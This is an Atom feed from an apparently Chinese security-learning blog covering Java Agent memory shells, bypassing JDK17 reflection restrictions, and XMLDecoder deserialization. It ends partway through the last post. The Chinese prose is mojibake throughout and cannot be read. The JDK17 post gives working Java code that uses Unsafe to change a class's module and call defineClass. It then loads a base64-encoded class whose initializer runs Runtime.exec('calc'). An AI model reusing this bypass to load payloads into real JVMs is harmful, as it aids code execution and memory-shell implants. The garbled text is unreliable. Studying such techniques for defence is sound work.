res);**æ–¹æ³•çš„è°ƒç”¨å°±å¯ä»¥äº†ï¼Œæˆ‘ä¼°è®¡æ˜¯ä¸è°ƒç”¨è¯¥æ–¹æ³•è°ƒç”¨é“¾å°±ä¼šç›´æ¥æ–­æ‰ï¼Œå¯¼è‡´æˆ‘å‘è¯·æ±‚å°±å¡åœ¨é‚£é‡Œä¸åŠ¨</p><p><img src="https://cdn.clown2024.cn/image-20241031231112320.png" alt="image-20241031231112320"></p><p>è€Œä¸”è¿™ç§æ–¹æ³•å†™å¦‚æœå¼¹è®¡ç®—å™¨çš„è¯ä»–ä¼šå¼¹äº”æ¬¡ï¼Œè¯´æ˜ä»–è°ƒç”¨é“¾ä¸­èµ°äº†äº”æ¬¡doFilteræ–¹æ³•</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&u_asig=1a0c384b17302758676971458e00f7&time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt+teD">https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&amp;u_asig=1a0c384b17302758676971458e00f7&amp;time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt%2BteD</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-agentä»‹ç»&quot;&gt;&lt;a href=&quot;#Java-Agentä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Java Agentä»‹ç»&quot;&gt;&lt;/a&gt;Java Agentä»‹ç»&lt;/h1&gt;&lt;p&gt;å®˜æ–¹æ–‡æ¡£ï¼š&lt;a href=&quot;https://docs.ora</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>JDK17åå°„é™åˆ¶ç»•è¿‡å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-29T15:44:00.000Z</published>
    <updated>2024-10-30T06:54:46.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jdk17åå°„é™åˆ¶"><a href="#JDK17åå°„é™åˆ¶" class="headerlink" title="JDK17åå°„é™åˆ¶"></a>JDK17åå°„é™åˆ¶</h1><p>åœ¨JDK9è‡³JDK16ç‰ˆæœ¬ä¹‹ä¸­ï¼ŒJava.*ä¾èµ–åŒ…ä¸‹æ‰€æœ‰çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•åœ¨è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå‡ºç°å…³äºéæ³•åå°„è®¿é—®çš„è­¦å‘Šï¼Œä½†æ˜¯åœ¨JDK17ä¹‹åï¼Œé‡‡ç”¨çš„æ˜¯å¼ºå°è£…ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸å†å…è®¸è¿™ä¸€ç±»çš„åå°„ï¼Œæ‰€æœ‰åå°„è®¿é—®<strong>java.*çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•</strong>çš„ä»£ç å°†æŠ›å‡ºInaccessibleObjectExceptionå¼‚å¸¸</p><p>æ¯”å¦‚ä¸‹é¢è·å–ClassLoaderçš„protectedçš„defineClassæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼šæŠ¥è¿™æ ·çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/image-20241030111739224.png" alt="image-20241030111739224"></p><h2 id="jdkæ¨¡å—åŒ–é™åˆ¶"><a href="#JDKæ¨¡å—åŒ–é™åˆ¶" class="headerlink" title="JDKæ¨¡å—åŒ–é™åˆ¶"></a>JDKæ¨¡å—åŒ–é™åˆ¶</h2><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·è¢«é™åˆ¶å‘¢ï¼Œè¿™æ˜¯ç”±äºåœ¨JDK9ä¹‹åå¼•å…¥çš„æ¨¡å—åŒ–æœºåˆ¶ï¼ŒæŒ‡Javaå¹³å°æ¨¡å—ç³»ç»Ÿï¼ˆJava Platform Module Systemï¼Œç®€ç§°JPMSï¼‰</p><p>æ¨¡å—åŒ–æœºåˆ¶çš„ä¸€äº›å…³é”®æ¦‚å¿µ(ç”±kimiç”Ÿæˆ)ï¼š</p><ul><li><strong>æ¨¡å—ï¼ˆModuleï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—æ˜¯ä¸€ç»„ç›¸å…³çš„åŒ…çš„é›†åˆï¼Œè¿™äº›åŒ…ä¸€èµ·æä¾›ç‰¹å®šçš„åŠŸèƒ½ã€‚</li><li><strong>æ¨¡å—åŒ–è·¯å¾„ï¼ˆModule Pathï¼‰</strong>ï¼šæ¨¡å—åŒ–è·¯å¾„æ˜¯ç±»è·¯å¾„çš„æ›¿ä»£å“ï¼Œç”¨äºæŒ‡å®šæ¨¡å—çš„ä½ç½®ã€‚</li><li><strong>æ¨¡å—æè¿°ç¬¦ï¼ˆModule Descriptorï¼‰</strong>ï¼šä¸€ä¸ªæ¨¡å—çš„é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸åä¸º<code>module-info.class</code>ï¼Œå®ƒå®šä¹‰äº†æ¨¡å—çš„åç§°ã€æ‰€éœ€çš„ä¾èµ–ã€æä¾›çš„æœåŠ¡ä»¥åŠå¯¹å…¶ä»–æ¨¡å—çš„ä¾èµ–ã€‚</li><li><strong>requires</strong>ï¼šåœ¨æ¨¡å—æè¿°ç¬¦ä¸­å£°æ˜æ¨¡å—ä¾èµ–ï¼ŒæŒ‡å®šå½“å‰æ¨¡å—éœ€è¦å“ªäº›å…¶ä»–æ¨¡å—ã€‚</li><li><strong>exports</strong>ï¼šå£°æ˜æ¨¡å—ä¸­çš„å“ªäº›åŒ…æ˜¯å¯ä¾›å…¶ä»–æ¨¡å—ä½¿ç”¨çš„ã€‚</li><li><strong>opens</strong>ï¼šå£°æ˜æ¨¡å—ä¸­çš„å“ªäº›åŒ…æ˜¯å¯ä¾›å…¶ä»–æ¨¡å—é€šè¿‡åå°„è®¿é—®çš„ã€‚</li><li><strong>uses</strong>ï¼šå£°æ˜æ¨¡å—éœ€è¦ä½¿ç”¨å“ªä¸ªæœåŠ¡æä¾›è€…ã€‚</li><li><strong>provides</strong>ï¼šå£°æ˜æ¨¡å—æä¾›äº†å“ªäº›æœåŠ¡å®ç°ã€‚</li><li><strong>transitive</strong>ï¼šä¾èµ–å…³ç³»çš„ä¼ é€’æ€§ï¼Œå³å¦‚æœæ¨¡å—Aä¾èµ–æ¨¡å—Bï¼Œè€Œæ¨¡å—Båˆä¾èµ–æ¨¡å—Cï¼Œé‚£ä¹ˆæ¨¡å—Aä¹Ÿéšå¼åœ°ä¾èµ–æ¨¡å—Cã€‚</li></ul><p>è¿™äº›ä¹Ÿå¯ä»¥å»çœ‹ä¸€çœ‹JDK9çš„å®˜æ–¹æ–°ç‰¹æ€§è¯´æ˜ï¼š<a href="https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6">https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹jdk17çš„jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030130830178.png" alt="image-20241030130830178"></p><p>å¯ä»¥çœ‹åˆ°ä»–çš„æ¯ä¸ªæ¨¡å—éƒ½æ˜¯æœ‰module-info.classæ–‡ä»¶çš„</p><p>åœ¨JDK9æ–°å¢äº†æ¨¡å—åŒ–æœåŠ¡ä¹‹åï¼Œpublicã€protectedç­‰è®¿é—®æƒé™ä¿®é¥°ç¬¦å°±åªåœ¨è‡ªå·±çš„æ¨¡å—é‡Œé¢ç”Ÿæ•ˆï¼Œæƒ³åœ¨æ¨¡å—å¤–è¢«è¯†åˆ«çš„è¯å°±éœ€è¦ä½¿ç”¨exportså…³é”®å­—æ¥å¯¼å‡º</p><p>å¯ä»¥çœ‹çœ‹javaæœ¬èº«çš„æ–‡ä»¶æ˜¯æ€ä¹ˆå†™çš„</p><p><img src="https://cdn.clown2024.cn/image-20241030132815410.png" alt="image-20241030132815410"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šå¸¸è§ç±»çš„å¯¼å‡ºï¼Œæ‰€ä»¥è¿™äº›å¸¸è§ç±»å¹³æ—¶æ‰èƒ½è¢«æˆ‘ä»¬è¯†åˆ«</p><p>è€Œèƒ½å¦è¢«åå°„è®¿é—®æ˜¯é€šè¿‡opensæŒ‡ä»¤æ¥å®šä¹‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªæœ‰opensæŒ‡ä»¤çš„classæ–‡ä»¶æ¥çœ‹çœ‹</p><p>æ¯”å¦‚è¿™ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241030133237491.png" alt="image-20241030133237491"></p><p>è¿™ä¸ªçš„æ„æ€å°±æ˜¯æŒ‡å®šæŸäº›ç‰¹å®šçš„æ¨¡å—æ‰èƒ½åœ¨è¿è¡Œæ—¶å¯¹è¯¥æ¨¡å—ä¸‹ç‰¹å®šåŒ…ä¸‹çš„ç±»è¿›è¡Œåå°„æ“ä½œï¼Œto åé¢è·Ÿæ¨¡å—åç§°ã€‚</p><p>åªæœ‰opens <packeage>è¡¨ç¤ºå¯¹æ‰€æœ‰æ¨¡å—å¼€æ”¾åå°„</packeage></p><p>å‰é¢çš„æ¨¡å—ä¸­å¹¶æ²¡æœ‰å¯¹java.langç­‰ç­‰çš„classè¿›è¡Œå¼€æ”¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå°±æ— æ³•åå°„è·å–å…¶épublicçš„å­—æ®µå’Œæ–¹æ³•</p><h1 id="unsafeç»•è¿‡"><a href="#Unsafeç»•è¿‡" class="headerlink" title="Unsafeç»•è¿‡"></a>Unsafeç»•è¿‡</h1><h2 id="unsafeä»‹ç»"><a href="#Unsafeä»‹ç»" class="headerlink" title="Unsafeä»‹ç»"></a>Unsafeä»‹ç»</h2><p>Unsafeæ˜¯ä½äºsun.miscåŒ…ä¸‹çš„ä¸€ä¸ªç±»ï¼Œä¸»è¦æä¾›ä¸€äº›ç”¨äºæ‰§è¡Œä½çº§åˆ«ã€ä¸å®‰å…¨æ“ä½œçš„æ–¹æ³•ï¼Œå¦‚ç›´æ¥è®¿é—®ç³»ç»Ÿå†…å­˜èµ„æºã€è‡ªä¸»ç®¡ç†å†…å­˜èµ„æºç­‰ï¼Œè¿™äº›æ–¹æ³•åœ¨æå‡Javaè¿è¡Œæ•ˆç‡ã€å¢å¼ºJavaè¯­è¨€åº•å±‚èµ„æºæ“ä½œèƒ½åŠ›æ–¹é¢èµ·åˆ°äº†å¾ˆå¤§çš„ä½œç”¨ã€‚ä½†ç”±äºUnsafeç±»ä½¿Javaè¯­è¨€æ‹¥æœ‰äº†ç±»ä¼¼Cè¯­è¨€æŒ‡é’ˆä¸€æ ·æ“ä½œå†…å­˜ç©ºé—´çš„èƒ½åŠ›ï¼Œè¿™æ— ç–‘ä¹Ÿå¢åŠ äº†ç¨‹åºå‘ç”Ÿç›¸å…³æŒ‡é’ˆé—®é¢˜çš„é£é™©ã€‚</p><p>sun.miscå’Œsun.reflectåŒ…ä¸‹çš„æˆ‘ä»¬æ˜¯å¯ä»¥æ­£å¸¸åå°„çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åˆ°è¿™ä¸ªç±»ï¼Œå¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241030134455456.png" alt="image-20241030134455456"></p><p>æœ‰å…³Unsafeç±»çš„æ›´è¯¦ç»†ä»‹ç»å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p><p>åœ¨JDK17å‰Unsafeæ˜¯æœ‰ä¸¤ä¸ªæ–¹æ³•å¯ä»¥è¿›è¡Œå­—èŠ‚ç çš„åŠ è½½</p><p>åœ¨JDK11ä¹‹å‰<code>defineClass</code>å’Œ<code>defineAnonymousClass</code>ä¸¤ç§æ–¹æ³•å¯ä»¥åŠ è½½å­—èŠ‚ç ï¼Œåˆ°JDK11å°±åªå‰©ä¸‹<code>defineAnonymousClass</code>ä¸€ç§æ–¹æ³•ï¼Œåœ¨JDK17ä¹‹åè¿™ä¸¤ç§æ–¹æ³•å°±éƒ½è¢«ç§»é™¤äº†</p><p>æ‰€ä»¥JDK17å‰å¯ä»¥ç”¨ä¸‹é¢è¿™ç§æ–¹å¼æ¥è¿›è¡Œåå°„ç±»çš„åŠ è½½</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>unsafe.defineAnonymousClass(Class.class,bytes,<span class="hljs-literal">null</span>).newInstance();<br></code></pre></td></tr></table></figure><p>åå°„è·å–theUnsafeå­—æ®µæ˜¯å› ä¸ºè¯¥å­—æ®µæ˜¯å•ä¾‹æ¨¡å¼</p><p><img src="https://cdn.clown2024.cn/image-20241030135005733.png" alt="image-20241030135005733"></p><p>ä¸è¿‡ä¹Ÿæœ‰é™æ€æ–¹æ³•æ¥è·å–Unsafeå®ä¾‹ï¼ŒåŒæ ·æ˜¯è¿”å›theUnsafeå­—æ®µçš„å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241030135048330.png" alt="image-20241030135048330"></p><h2 id="jdk17unsafeç»•è¿‡"><a href="#JDK17Unsafeç»•è¿‡" class="headerlink" title="JDK17Unsafeç»•è¿‡"></a>JDK17Unsafeç»•è¿‡</h2><p>é‚£ä¹ˆJDK17ä¹‹åæˆ‘ä»¬è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åå°„è°ƒç”¨épublicçš„å­—æ®µæˆ–æ–¹æ³•æ—¶ï¼Œjavaæ˜¯åœ¨setAccessiableæ–¹æ³•æ‰§è¡Œçš„æ—¶å€™æŠ›å‡ºå¼‚å¸¸çš„ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹ä»–å¼‚å¸¸æŠ›å‡ºé€»è¾‘ï¼Œç›´æ¥æ ¹æ®æŠ¥é”™çš„è°ƒç”¨æ ˆå»çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241030135950313.png" alt="image-20241030135950313"></p><p>é¦–å…ˆä»–ä¼šèµ°åˆ°checkCanSetAccessibleæ–¹æ³•ï¼Œä»æ„æ€ä¸Šä¹ŸçŸ¥é“ï¼Œå°±æ˜¯æ£€æŸ¥èƒ½å¦è®¾ç½®æƒé™çš„æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241030140555749.png" alt="image-20241030140555749"></p><p>ç„¶åä¸€è·¯èµ°åˆ°è¿™é‡Œå…·ä½“çš„åˆ¤æ–­é€»è¾‘åœ¨è¿™ï¼Œè¿™é‡Œæˆ–è·å–åå°„ç›®æ ‡çš„moduleå’Œè°ƒç”¨çš„ç±»çš„moduleï¼Œç„¶ååˆ¤æ–­ä»–ä»¬æ˜¯å¦ä¸ºåŒä¸€ä¸ªmoduleï¼Œæˆ–è€…æ˜¯å¦ä¸ºObject.classçš„moduleï¼ŒObject.classçš„moduleå°±æ˜¯<strong>java.base</strong>ï¼Œå†æˆ–è€…å°±æ˜¯ç›®æ ‡æ¨¡å—æœªå®šä¹‰æ¨¡å—å</p><p>åé¢è¿˜æœ‰ä¸€äº›ç›¸å…³çš„åˆ¤æ–­ï¼Œä½†æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„å°±æ˜¯è¿™ä¸€éƒ¨åˆ†å°±ä¸å†åˆ†æäº†</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿèƒ½çŸ¥é“æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯ä¿®æ”¹å½“å‰ç±»çš„Moduleå’Œè¦åå°„ä¿®æ”¹çš„ç±»çš„moduleä¸€è‡´å³å¯</p><p>è€ŒUnsafeç±»å°±æä¾›äº†è¿™æ ·çš„æ–¹æ³•æ¥ä¿®æ”¹moduleæ˜¯æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹åç§»é‡ï¼Œå°†æˆ‘ä»¬çš„ç±»çš„moduleä¿®æ”¹æˆåŸºç¡€module</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bypass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException, InstantiationException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAthdHRhY2suamF2YQwACgALBwAdDAAeAB8BAARjYWxjDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABmF0dGFjawEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAACAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAAAwAIAA4ACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAABgAJAAkADAAHAA0ACAAWAAoADwAAAAcAAkwHABAJAAEAEQAAAAIAEg==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(payload);<br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//è·å–Unsafeå®ä¾‹</span><br>        <span class="hljs-comment">//è·å–ClassLoaderçš„module</span><br>        Module baseModule=Object.class.getModule();<br><br>        Class&lt;?&gt; currentClass= Bypass.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule); <span class="hljs-comment">//æ›´æ”¹å½“å‰è¿è¡Œç±»çš„Module</span><br>        <span class="hljs-comment">//ç°åœ¨å°±èƒ½æ­£å¸¸åå°„äº†</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; calc= (Class&lt;?&gt;) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;attack&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030142827432.png" alt="image-20241030142827432"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq+fbD">https://xz.aliyun.com/t/14048?time__1311=GqAxuDRD0GK7qGNPeeqBKquO1fq%2BfbD</a></p><p><a href="https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx+xCwo4mhexcirc7=WoD">https://xz.aliyun.com/t/15035?time__1311=GqjxuiqiuDgDlxGgx%2BxCwo4mhexcirc7%3DWoD</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jdk17åå°„é™åˆ¶&quot;&gt;&lt;a href=&quot;#JDK17åå°„é™åˆ¶&quot; class=&quot;headerlink&quot; title=&quot;JDK17åå°„é™åˆ¶&quot;&gt;&lt;/a&gt;JDK17åå°„é™åˆ¶&lt;/h1&gt;&lt;p&gt;åœ¨JDK9è‡³JDK16ç‰ˆæœ¬ä¹‹ä¸­ï¼ŒJava.*ä¾èµ–åŒ…ä¸‹æ‰€æœ‰çš„éå…¬å…±å­—æ®µå’Œæ–¹æ³•åœ¨è¿›è¡Œåå°„</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XMLååºåˆ—åŒ–å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/25/XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-24T17:24:18.000Z</published>
    <updated>2024-10-25T18:27:56.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xmldecoderä»‹ç»"><a href="#XMLDecoderä»‹ç»" class="headerlink" title="XMLDecoderä»‹ç»"></a>XMLDecoderä»‹ç»</h1><p>XMLDecoderæ˜¯javaè‡ªå¸¦çš„ä»¥SAXæ–¹å¼è§£æxmlçš„ç±»ï¼Œå…¶åœ¨ååºåˆ—åŒ–ç»è¿‡ç‰¹æ®Šæ„é€ çš„æ•°æ®æ—¶å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>æ‰€è°“çš„è§£æå°±æ˜¯åœ¨javaå¯¹è±¡å’Œxmlæ–‡ä»¶ä¹‹é—´çš„è½¬åŒ–ã€‚</p><h2 id="saxæ˜¯ä»€ä¹ˆ"><a href="#SAXæ˜¯ä»€ä¹ˆ" class="headerlink" title="SAXæ˜¯ä»€ä¹ˆ"></a>SAXæ˜¯ä»€ä¹ˆ</h2><p>SAXå…¨ç§°ä¸º<code>Simple API for XML</code>ï¼Œåœ¨Javaä¸­æœ‰ä¸¤ç§åŸç”Ÿè§£æxmlçš„æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯SAXå’ŒDOMã€‚ä¸¤è€…åŒºåˆ«åœ¨äºï¼š</p><ol><li>Domè§£æåŠŸèƒ½å¼ºå¤§ï¼Œå¯å¢åˆ æ”¹æŸ¥ï¼Œæ“ä½œæ—¶ä¼šå°†xmlæ–‡æ¡£ä»¥æ–‡æ¡£å¯¹è±¡çš„æ–¹å¼è¯»å–åˆ°å†…å­˜ä¸­ï¼Œå› æ­¤é€‚ç”¨äºå°æ–‡æ¡£</li><li>Saxè§£ææ˜¯ä»å¤´åˆ°å°¾é€è¡Œé€ä¸ªå…ƒç´ è¯»å–å†…å®¹ï¼Œä¿®æ”¹è¾ƒä¸ºä¸ä¾¿ï¼Œä½†é€‚ç”¨äºåªè¯»çš„å¤§æ–‡æ¡£</li></ol><p>SAXé‡‡ç”¨äº‹ä»¶é©±åŠ¨çš„å½¢å¼æ¥è§£æxmlæ–‡æ¡£ï¼Œç®€å•æ¥è®²å°±æ˜¯è§¦å‘äº†äº‹ä»¶å°±å»åšäº‹ä»¶å¯¹åº”çš„å›è°ƒæ–¹æ³•ã€‚</p><p>åœ¨SAXä¸­ï¼Œè¯»å–åˆ°æ–‡æ¡£å¼€å¤´ã€ç»“å°¾ï¼Œå…ƒç´ çš„å¼€å¤´å’Œç»“å°¾ä»¥åŠç¼–ç è½¬æ¢ç­‰æ“ä½œæ—¶ä¼šè§¦å‘ä¸€äº›å›è°ƒæ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨è¿™äº›å›è°ƒæ–¹æ³•ä¸­è¿›è¡Œç›¸åº”äº‹ä»¶å¤„ç†ï¼š</p><ul><li>startDocument()</li><li>endDocument()</li><li>startElement()</li><li>endElement()</li><li>characters()</li></ul><h2 id="ç®€å•demo"><a href="#ç®€å•demo" class="headerlink" title="ç®€å•demo"></a>ç®€å•demo</h2><p>ä¸€ä¸ªç®€å•çš„pojoç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.XMLTest;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello, my name is &quot;</span>+name);<br>    